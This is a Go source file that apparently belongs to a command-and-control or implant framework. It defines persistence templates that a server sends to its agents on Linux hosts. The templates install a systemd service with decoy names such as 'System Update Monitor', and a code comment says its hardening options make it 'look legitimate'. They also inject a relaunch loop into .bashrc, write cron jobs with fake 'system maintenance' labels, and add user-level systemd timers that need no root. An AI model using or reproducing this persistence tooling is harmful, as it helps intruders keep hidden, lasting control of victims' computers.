// internal/templates/persistence.go
package templates

import (
	"encoding/json"
)

// PersistenceTemplate represents server-side template data sent to agents
type PersistenceTemplate struct {
	Version   int               `json:"v"`   // Template version for future compatibility
	Type      string            `json:"t"`   // Template type: "systemd", "bashrc", "cron", "launchd"
	Templates map[string]string `json:"tpl"` // Template strings keyed by name
	Params    map[string]string `json:"p"`   // Parameters like service name, description
}

// Linux Systemd template keys
const (
	TplUnitHeader     = "unit_header"
	TplDescPrefix     = "desc_prefix"
	TplServiceSuffix  = "service_suffix"
	TplAfterNetwork   = "after_network"
	TplWantsNetwork   = "wants_network"
	TplServiceHeader  = "service_header"
	TplTypeSimple     = "type_simple"
	TplRestartAlways  = "restart_always"
	TplRestartSec     = "restart_sec"
	TplExecStart      = "exec_start"
	TplStdOutNull     = "stdout_null"
	TplStdErrNull     = "stderr_null"
	TplSecComment     = "sec_comment"
	TplPrivateTmp     = "private_tmp"
	TplNoNewPrivs     = "no_new_privs"
	TplProtectSys     = "protect_sys"
	TplProtectHome    = "protect_home"
	TplReadWriteTmp   = "read_write_tmp"
	TplInstallHeader  = "install_header"
	TplWantedBy       = "wanted_by"
)

// Linux Bashrc template keys
const (
	TplBashIfSudo   = "bash_if_sudo"
	TplBashIfPgrep  = "bash_if_pgrep"
	TplBashPgrepEnd = "bash_pgrep_end"
	TplBashNohup    = "bash_nohup"
	TplBashNohupEnd = "bash_nohup_end"
	TplBashFi       = "bash_fi"
	TplBashEndFi    = "bash_end_fi"
)

// Linux Cron template keys
const (
	// Script content
	TplCronShebang     = "cron_shebang"
	TplCronComment     = "cron_comment"
	TplCronDevNull     = "cron_devnull"
	TplCronMaintHeader = "cron_maint_hdr"
	TplCronShellBash   = "cron_shell"
	TplCronPathEnv     = "cron_path"

	// Paths
	TplCronEtcCronD      = "cron_etc_d"
	TplCronEtcAnacrontab = "cron_anacrontab"
	TplCronEtcHourly     = "cron_etc_hourly"
	TplCronEtcDaily      = "cron_etc_daily"
	TplCronEtcWeekly     = "cron_etc_weekly"
	TplCronEtcMonthly    = "cron_etc_monthly"
	TplCronSpoolCrontabs = "cron_spool_crontabs"
	TplCronSpoolCron     = "cron_spool_cron"
	TplCronSpoolTabs     = "cron_spool_tabs"

	// Filenames
	TplCronFileCheck  = "cron_file_check"
	TplCronFileUpdate = "cron_file_update"
	TplCronFileMaint  = "cron_file_maint"

	// Intervals
	TplCronIntHourly  = "cron_int_hourly"
	TplCronIntDaily   = "cron_int_daily"
	TplCronIntWeekly  = "cron_int_weekly"
	TplCronIntMonthly = "cron_int_monthly"
	TplCronIntReboot  = "cron_int_reboot"

	// Systemd user timer (user-level alternative to cron, no root needed)
	TplTimerUserDir     = "timer_user_dir"     // ~/.config/systemd/user
	TplTimerHeader      = "timer_header"       // [Timer]
	TplTimerOnCalendar  = "timer_on_calendar"  // OnCalendar=
	TplTimerOnBootSec   = "timer_on_boot_sec"  // OnBootSec=
	TplTimerOnUnitSec   = "timer_on_unit_sec"  // OnUnitActiveSec=
	TplTimerPersistent  = "timer_persistent"   // Persistent=true
	TplTimerExt         = "timer_ext"          // .timer
	TplTimerDefaultName = "timer_default_name" // update-manager
)

// Parameter keys
const (
	ParamServiceName = "service_name"
	ParamDescription = "description"
	ParamTarget      = "target"
	ParamUserService = "user_service"
)

// GetLinuxSystemdTemplate returns the systemd service template for Linux persistence
func GetLinuxSystemdTemplate(serviceName, description string, userService bool) *PersistenceTemplate {
	target := "multi-user.target"
	if userService {
		target = "default.target"
	}

	if description == "" {
		if userService {
			description = "User Session Manager"
		} else {
			description = "System Update Monitor"
		}
	}

	if serviceName == "" {
		serviceName = "system-update"
	}

	return &PersistenceTemplate{
		Version: 1,
		Type:    "systemd",
		Templates: map[string]string{
			TplUnitHeader:    "[Unit]",
			TplDescPrefix:    "Description=",
			TplServiceSuffix: " Service",
			TplAfterNetwork:  "After=network.target network-online.target",
			TplWantsNetwork:  "Wants=network-online.target",
			TplServiceHeader: "[Service]",
			TplTypeSimple:    "Type=simple",
			TplRestartAlways: "Restart=always",
			TplRestartSec:    "RestartSec=60",
			TplExecStart:     "ExecStart=",
			TplStdOutNull:    "StandardOutput=null",
			TplStdErrNull:    "StandardError=null",
			TplSecComment:    "# Security hardening (makes it look legitimate)",
			TplPrivateTmp:    "PrivateTmp=yes",
			TplNoNewPrivs:    "NoNewPrivileges=true",
			TplProtectSys:    "ProtectSystem=strict",
			TplProtectHome:   "ProtectHome=read-only",
			TplReadWriteTmp:  "ReadWritePaths=/tmp",
			TplInstallHeader: "[Install]",
			TplWantedBy:      "WantedBy=",
		},
		Params: map[string]string{
			ParamServiceName: serviceName,
			ParamDescription: description,
			ParamTarget:      target,
			ParamUserService: boolToString(userService),
		},
	}
}

// GetLinuxBashrcTemplate returns the bashrc injection template for Linux persistence
func GetLinuxBashrcTemplate() *PersistenceTemplate {
	return &PersistenceTemplate{
		Version: 1,
		Type:    "bashrc",
		Templates: map[string]string{
			TplBashIfSudo:   "if [ -z \"$SUDO_COMMAND\" ]; then",
			TplBashIfPgrep:  "    if ! pgrep -f \"",
			TplBashPgrepEnd: "\" > /dev/null 2>&1; then",
			TplBashNohup:    "        (nohup ",
			TplBashNohupEnd: " > /dev/null 2>&1 &) 2>/dev/null",
			TplBashFi:       "    fi",
			TplBashEndFi:    "fi",
		},
		Params: map[string]string{},
	}
}

// GetLinuxCronTemplate returns the cron persistence template for Linux
func GetLinuxCronTemplate() *PersistenceTemplate {
	return &PersistenceTemplate{
		Version: 1,
		Type:    "cron",
		Templates: map[string]string{
			// Script content
			TplCronShebang:     "#!/bin/bash",
			TplCronComment:     "# Added by system at",
			TplCronDevNull:     ">/dev/null 2>&1",
			TplCronMaintHeader: "# System maintenance task",
			TplCronShellBash:   "SHELL=/bin/bash",
			TplCronPathEnv:     "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",

			// Paths
			TplCronEtcCronD:      "/etc/cron.d",
			TplCronEtcAnacrontab: "/etc/anacrontab",
			TplCronEtcHourly:     "/etc/cron.hourly",
			TplCronEtcDaily:      "/etc/cron.daily",
			TplCronEtcWeekly:     "/etc/cron.weekly",
			TplCronEtcMonthly:    "/etc/cron.monthly",
			TplCronSpoolCrontabs: "/var/spool/cron/crontabs/%s",
			TplCronSpoolCron:     "/var/spool/cron/%s",
			TplCronSpoolTabs:     "/var/spool/cron/tabs/%s",

			// Filenames
			TplCronFileCheck:  "system-check",
			TplCronFileUpdate: "system-update",
			TplCronFileMaint:  "system-maint",

			// Intervals
			TplCronIntHourly:  "@hourly",
			TplCronIntDaily:   "@daily",
			TplCronIntWeekly:  "@weekly",
			TplCronIntMonthly: "@monthly",
			TplCronIntReboot:  "@reboot",

			// Systemd user timer (user-level, no root needed)
			TplTimerUserDir:     ".config/systemd/user",
			TplTimerHeader:      "[Timer]",
			TplTimerOnCalendar:  "OnCalendar=",
			TplTimerOnBootSec:   "OnBootSec=",
			TplTimerOnUnitSec:   "OnUnitActiveSec=",
			TplTimerPersistent:  "Persistent=true",
			TplTimerExt:         ".timer",
			TplTimerDefaultName: "update-manager",
		},
		Params: map[string]string{},
	}
}

// ToJSON serializes the template to JSON bytes
func (t *PersistenceTemplate) ToJSON() ([]byte, error) {
	return json.Marshal(t)
}

// ParsePersistenceTemplate deserializes JSON to a PersistenceTemplate
func ParsePersistenceTemplate(data []byte) (*PersistenceTemplate, error) {
	var t PersistenceTemplate
	if err := json.Unmarshal(data, &t); err != nil {
		return nil, err
	}
	return &t, nil
}

func boolToString(b bool) string {
	if b {
		return "true"
	}
	return "false"
}
